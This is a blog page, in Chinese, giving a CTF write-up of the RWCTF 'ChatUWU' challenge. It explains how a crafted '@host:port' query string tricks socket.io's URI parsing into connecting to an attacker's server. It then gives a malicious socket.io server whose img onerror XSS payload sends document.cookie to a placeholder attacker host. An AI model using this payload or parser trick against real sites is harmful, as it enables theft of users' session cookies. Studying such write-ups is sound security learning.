@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="RWCTF2022&amp;CHATUWU" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            RWCTF2022&amp;CHATUWU
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 代码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E5%88%A9%E7%94%A8parse%E8%A7%A3%E6%9E%90%E7%9A%84%E9%97%AE%E9%A2%98"><span class="post-toc-text">0x02 利用parse解析的问题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="post-toc-text">0x03 构造恶意服务器</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0xFF"><span class="post-toc-text">0xFF</span></a></li></ol>
+            
+        
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>这道题说难不难，说简单也不简单，反正我没做出来 XD</p>
+<p>比赛的时候我看到有个DOMPurify，以为是找这个漏洞，然后bypass，其实不是的</p>
+<p>总结下来这个题目就两个点</p>
+<ul>
+<li>socket.io的uri解析trick导致跳转</li>
+<li>使用恶意websocket服务器，绕过DOMPurify</li>
+</ul>
+<h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><p>首先看源码</p>
+<p>客户端：</p>
+<p><code>index.html</code>，这里只展示相关代码</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;ul id=&quot;messages&quot;&gt;&lt;/ul&gt;
+&lt;form id=&quot;form&quot; action=&quot;&quot;&gt;
+    &lt;input id=&quot;input&quot; autocomplete=&quot;off&quot; maxlength=&quot;140&quot;/&gt;
+    &lt;button&gt;Send&lt;/button&gt;
+&lt;/form&gt;
+&lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;
+
+&lt;script&gt;
+    function reset() &#123;
+        location.href = `?nickname=guest$&#123;String(Math.random()).substr(-4)&#125;&amp;room=textContent`;
+    &#125;
+
+    let query = new URLSearchParams(location.search),
+        nickname = query.get(&#39;nickname&#39;),
+        room = query.get(&#39;room&#39;);
+    if (!nickname || !room) &#123;
+        reset();
+    &#125;
+    for (let k of query.keys()) &#123;
+        if (![&#39;nickname&#39;, &#39;room&#39;].includes(k)) &#123;
+            reset();
+        &#125;
+    &#125;
+    document.title += &#39; - &#39; + room;
+    let socket = io(`/$&#123;location.search&#125;`),
+        messages = document.getElementById(&#39;messages&#39;),
+        form = document.getElementById(&#39;form&#39;),
+        input = document.getElementById(&#39;input&#39;);
+
+    form.addEventListener(&#39;submit&#39;, function (e) &#123;
+        e.preventDefault();
+        if (input.value) &#123;
+            socket.emit(&#39;msg&#39;, &#123;from: nickname, text: input.value&#125;);
+            input.value = &#39;&#39;;
+        &#125;
+    &#125;);
+
+    socket.on(&#39;msg&#39;, function (msg) &#123;
+        let item = document.createElement(&#39;li&#39;),
+            msgtext = `[$&#123;new Date().toLocaleTimeString()&#125;] $&#123;msg.from&#125;: $&#123;msg.text&#125;`;
+        room === &#39;DOMPurify&#39; &amp;&amp; msg.isHtml ? item.innerHTML = msgtext : item.textContent = msgtext;
+        messages.appendChild(item);
+        window.scrollTo(0, document.body.scrollHeight);
+    &#125;);
+
+    socket.on(&#39;error&#39;, msg =&gt; &#123;
+        alert(msg);
+        reset();
+    &#125;);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>服务端：</p>
+<p><code>index.js</code></p>
+<pre><code class="js">const app = require(&#39;express&#39;)();
+const http = require(&#39;http&#39;).Server(app);
+const io = require(&#39;socket.io&#39;)(http);
+const DOMPurify = require(&#39;isomorphic-dompurify&#39;);
+
+const hostname = process.env.HOSTNAME || &#39;0.0.0.0&#39;;
+const port = process.env.PORT || 8000;
+const rooms = [&#39;textContent&#39;, &#39;DOMPurify&#39;];
+
+
+app.get(&#39;/&#39;, (req, res) =&gt; &#123;
+    res.sendFile(__dirname + &#39;/index.html&#39;);
+&#125;);
+
+io.on(&#39;connection&#39;, (socket) =&gt; &#123;
+    let &#123;nickname, room&#125; = socket.handshake.query;
+    if (!rooms.includes(room)) &#123;
+        socket.emit(&#39;error&#39;, &#39;the room does not exist&#39;);
+        socket.disconnect(true);
+        return;
+    &#125;
+    socket.join(room);
+    io.to(room).emit(&#39;msg&#39;, &#123;
+        from: &#39;system&#39;,
+        // text: `$&#123;nickname&#125; has joined the room`
+        text: &#39;a new user has joined the room&#39;
+    &#125;);
+    socket.on(&#39;msg&#39;, msg =&gt; &#123;
+        msg.from = String(msg.from).substr(0, 16)
+        msg.text = String(msg.text).substr(0, 140)
+        if (room === &#39;DOMPurify&#39;) &#123;
+            io.to(room).emit(&#39;msg&#39;, &#123;
+                from: DOMPurify.sanitize(msg.from),
+                text: DOMPurify.sanitize(msg.text),
+                isHtml: true
+            &#125;);
+        &#125; else &#123;
+            io.to(room).emit(&#39;msg&#39;, &#123;
+                from: msg.from,
+                text: msg.text,
+                isHtml: false
+            &#125;);
+        &#125;
+    &#125;);
+&#125;);
+
+http.listen(port, hostname, () =&gt; &#123;
+    console.log(`ChatUWU server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`);
+&#125;);
+</code></pre>
+<p>首先解释一下这些代码的意思</p>
+<p>这是一个用socket.io库搭起来的即时聊天室，基于websocket协议。</p>
+<p>websocket是一种全面双工通讯的网络技术，任意一方都可以建立连接将数据推向另一方，websocket只需要建立一次连接，就可以一直保持通话。</p>
+<p>客户端里的<code>index.html</code></p>
+<pre><code class="javascript">    let socket = io(`/$&#123;location.search&#125;`),
+        messages = document.getElementById(&#39;messages&#39;),
+        form = document.getElementById(&#39;form&#39;),
+        input = document.getElementById(&#39;input&#39;);
+</code></pre>
+<p>这里是建立一个websocket连接</p>
+<pre><code class="js">    form.addEventListener(&#39;submit&#39;, function (e) &#123;
+        e.preventDefault();
+        if (input.value) &#123;
+            socket.emit(&#39;msg&#39;, &#123;from: nickname, text: input.value&#125;);
+            input.value = &#39;&#39;;
+        &#125;
+    &#125;);
+</code></pre>
+<p>这里是向websocket服务端提交数据，数据的格式就是{“from”:”adasd”,”text”:”123”}<br>是通过socket.emit来提交，并将事件名称命名为msg</p>
+<pre><code class="js">socket.on(&#39;msg&#39;, function (msg) &#123;
+        let item = document.createElement(&#39;li&#39;),
+            msgtext = `[$&#123;new Date().toLocaleTimeString()&#125;] $&#123;msg.from&#125;: $&#123;msg.text&#125;`;
+        room === &#39;DOMPurify&#39; &amp;&amp; msg.isHtml ? item.innerHTML = msgtext : item.textContent = msgtext;
+        messages.appendChild(item);
+        window.scrollTo(0, document.body.scrollHeight);
+    &#125;);
+</code></pre>
+<p>这里就是关键了，socket.on就是监听msg事件，并将获得的数据进行处理</p>
+<p>这里处理的方式就是新建一个对象，并判断得到的数据里的room的值是否为DOMPurify，如果是，那么就以HTML元素来插入值</p>
+<p>就是这个地方进行HTML注入，从而进行XSS</p>
+<p>接下来看服务端的<code>index.js</code></p>
+<pre><code class="js">io.on(&#39;connection&#39;, (socket) =&gt; &#123;
+    let &#123;nickname, room&#125; = socket.handshake.query;
+    if (!rooms.includes(room)) &#123;
+        socket.emit(&#39;error&#39;, &#39;the room does not exist&#39;);
+        socket.disconnect(true);
+        return;
+    &#125;
+</code></pre>
+<p>这里就是通过判断参数里是否有对应的值来决定是否建立连接</p>
+<pre><code class="js">    socket.on(&#39;msg&#39;, msg =&gt; &#123;
+        msg.from = String(msg.from).substr(0, 16)
+        msg.text = String(msg.text).substr(0, 140)
+        if (room === &#39;DOMPurify&#39;) &#123;
+            io.to(room).emit(&#39;msg&#39;, &#123;
+                from: DOMPurify.sanitize(msg.from),
+                text: DOMPurify.sanitize(msg.text),
+                isHtml: true
+            &#125;);
+        &#125; else &#123;
+            io.to(room).emit(&#39;msg&#39;, &#123;
+                from: msg.from,
+                text: msg.text,
+                isHtml: false
+            &#125;);
+        &#125;
+    &#125;);
+</code></pre>
+<p>这里的就是关键了，监听msg事件，并判断将其接受到的值，如果room的值为DOMPurify，就对from参数和text参数调用DOMPurify.sanitize，来清理HTML代码，然后再返回给客户端</p>
+<p>那么该如何绕过呢，可以做一个假的服务端，让他连接，因为从客户端那里可以知道，他没有明确指定连接谁</p>
+<p>但是又如何让他连我的假服务端呢</p>
+<h2 id="0x02-利用parse解析的问题"><a href="#0x02-利用parse解析的问题" class="headerlink" title="0x02 利用parse解析的问题"></a>0x02 利用parse解析的问题</h2><p>这里就是看客户端的</p>
+<pre><code class="js">let socket = io(`/$&#123;location.search&#125;`)
+</code></pre>
+<p>location.search就是当前网页的url里’&#x2F;‘后面的内容</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112026402.png" alt="image-20230111202606370"></p>
+<p>设断点，看代码</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112005675.png" alt="image-20230111200523556"></p>
+<p>然后会跳入<code>lookup()</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112011435.png" alt="image-20230111201157357"></p>
+<p>可以发现，他在这里调用了<code>Manager()</code>，去官官方文档看看这个是什么意思</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112013466.png" alt="image-20230111201350381"></p>
+<p>就是来建立客户端和服务端的连接，进去看看</p>
+<p><code>manager.js</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112048737.png" alt="image-20230111204852677"></p>
+<p>this.uri是我们传入的uri,然后会调用this.open()来建立连接</p>
+<p>继续跟进</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112050544.png" alt="image-20230111205046485"></p>
+<p>这里是调用Engine函数来实现真正的连接，继续跟进</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112054389.png" alt="image-20230111205417337"></p>
+<p>跳入Socket类的构造函数里，这里会解析uri，并取他的host值</p>
+<p>最后建立连接的服务端就是的就是以这个host值作为主机名。看一下前面parse函数是怎么解析的</p>
+<p>最终使用了<code>parse()</code>对uri进行解析</p>
+<pre><code class="js">// imported from https://github.com/galkn/parseuri
+/**
+ * Parses an URI
+ *
+ * @author Steven Levithan &lt;stevenlevithan.com&gt; (MIT license)
+ * @api private
+ */
+const re = /^(?:(?![^:@]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?((?:[a-f0-9]&#123;0,4&#125;:)&#123;2,7&#125;[a-f0-9]&#123;0,4&#125;|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/;
+const parts = [
+    &#39;source&#39;, &#39;protocol&#39;, &#39;authority&#39;, &#39;userInfo&#39;, &#39;user&#39;, &#39;password&#39;, &#39;host&#39;, &#39;port&#39;, &#39;relative&#39;, &#39;path&#39;, &#39;directory&#39;, &#39;file&#39;, &#39;query&#39;, &#39;anchor&#39;
+];
+export function parse(str) &#123;
+    const src = str, b = str.indexOf(&#39;[&#39;), e = str.indexOf(&#39;]&#39;);
+    if (b != -1 &amp;&amp; e != -1) &#123;
+        str = str.substring(0, b) + str.substring(b, e).replace(/:/g, &#39;;&#39;) + str.substring(e, str.length);
+    &#125;
+    let m = re.exec(str || &#39;&#39;), uri = &#123;&#125;, i = 14;
+    while (i--) &#123;
+        uri[parts[i]] = m[i] || &#39;&#39;;
+    &#125;
+    if (b != -1 &amp;&amp; e != -1) &#123;
+        uri.source = src;
+        uri.host = uri.host.substring(1, uri.host.length - 1).replace(/;/g, &#39;:&#39;);
+        uri.authority = uri.authority.replace(&#39;[&#39;, &#39;&#39;).replace(&#39;]&#39;, &#39;&#39;).replace(/;/g, &#39;:&#39;);
+        uri.ipv6uri = true;
+    &#125;
+    uri.pathNames = pathNames(uri, uri[&#39;path&#39;]);
+    uri.queryKey = queryKey(uri, uri[&#39;query&#39;]);
+    return uri;
+&#125;
+function pathNames(obj, path) &#123;
+    const regx = /\/&#123;2,9&#125;/g, names = path.replace(regx, &quot;/&quot;).split(&quot;/&quot;);
+    if (path.slice(0, 1) == &#39;/&#39; || path.length === 0) &#123;
+        names.splice(0, 1);
+    &#125;
+    if (path.slice(-1) == &#39;/&#39;) &#123;
+        names.splice(names.length - 1, 1);
+    &#125;
+    return names;
+&#125;
+function queryKey(uri, query) &#123;
+    const data = &#123;&#125;;
+    query.replace(/(?:^|&amp;)([^&amp;=]*)=?([^&amp;]*)/g, function ($0, $1, $2) &#123;
+        if ($1) &#123;
+            data[$1] = $2;
+        &#125;
+    &#125;);
+    return data;
+&#125;
+</code></pre>
+<p>有很长一段正则匹配,就是利用这里的正则匹配的问题，来使客户端与恶意服务端建立连接</p>
+<p>继续执行一下</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112034316.png" alt="image-20230111203400240"></p>
+<p>可以发现会得到14个元素的数组，并将这些元素于parts里的元素一一对应，构成解析后的uri对象</p>
+<p>当使用的uri为<code>http://47.254.28.30:58000/?nickname=guest0423&amp;room=textContent@127.0.0.1:9999</code>时，可以发现host被解析为127.0.0.1，且port为9999。</p>
+<p>（具体为什么，感兴趣的师傅可以研究一下那个正则匹配）</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112115820.png" alt="image-20230111211504782"></p>
+<h2 id="0x03-构造恶意服务器"><a href="#0x03-构造恶意服务器" class="headerlink" title="0x03 构造恶意服务器"></a>0x03 构造恶意服务器</h2><p>这样子，我们就可以让客户端和我们的恶意服务端连接，并且发送xss代码，这样当bot访问我们给的url的时候，就会造成xss，获取它的cookie</p>
+<p>恶意服务端，根据题目的服务改一下</p>
+<p><code>evilindex.js</code></p>
+<pre><code class="js">const app = require(&#39;express&#39;)();
+const http = require(&#39;http&#39;).Server(app);
+const io = require(&#39;socket.io&#39;)(http, &#123;cors: &#123;origin: &quot;*&quot;&#125;&#125;);//设置允许跨域
+const cors = require(&#39;cors&#39;);
+const hostname = &#39;0.0.0.0&#39;;
+const port = 9998;
+const room = &quot;DOMPurify&quot;;
+
+app.use(cors());
+
+app.get(&#39;/&#39;, (req, res) =&gt; &#123;
+    console.log(req.query);
+&#125;);
+
+io.on(&#39;connection&#39;, (socket) =&gt; &#123;
+    console.log(socket.handshake.address)
+    socket.join(room);
+    io.to(room).emit(&#39;msg&#39;, &#123;
+        from: &quot;pankas&quot;,
+        text: &quot;&lt;img src=1 onerror=&#39;location.href=`http://&lt;yourhostname&gt;:&lt;yourip&gt;/?flag=$&#123;document.cookie&#125;`&#39;&gt;&quot;,//为了稳定触发最好还是用 onerror
+        isHtml: true
+    &#125;);
+&#125;);
+
+http.listen(port, hostname, () =&gt; &#123;
+    console.log(`ChatUWU server running at http://$&#123;hostname&#125;:$&#123;port&#125;/`);
+&#125;);
+</code></pre>
+<p>然后让bot访问</p>
+<p><code>http://47.254.28.30:58000/?room=DOMPurify&amp;nickname=v2i@yourHostname:yourPort</code></p>
+<p>就可以得到flag</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301112210841.png" alt="image-20230111221009788"></p>
+<h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2><p>参考链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/task/24141">老外的wp</a></li>
+<li><a target="_blank" rel="noopener" href="https://pankas.top/2023/01/09/realworldctf2023-chatuwu/#ChatUWU">pankas师傅</a></li>
+<li><a target="_blank" rel="noopener" href="https://socket.io/">socket.io</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-03</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/CTF/'>
+                            CTF
+                        </a>
+                    
+                        <a href='/tags/WEB/'>
+                            WEB
+                        </a>
+                    
+                        <a href='/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/'>
+                            前端安全
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
